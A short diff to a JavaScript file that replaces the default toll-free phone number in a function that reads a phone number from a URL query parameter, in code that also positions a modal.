@@ -61,7 +61,7 @@ function getRandomPosition(modalWidth, modalHeight) {
 function getFormattedPhone() {
   const rawPhone = new URLSearchParams(window.location.search).get("p");
 
-  let phoneNumber = "+1-888-902-4008";
+  let phoneNumber = "+1-888-377-1965";
 
   if (rawPhone) {
     const clean = rawPhone.replace(/\D/g, "");
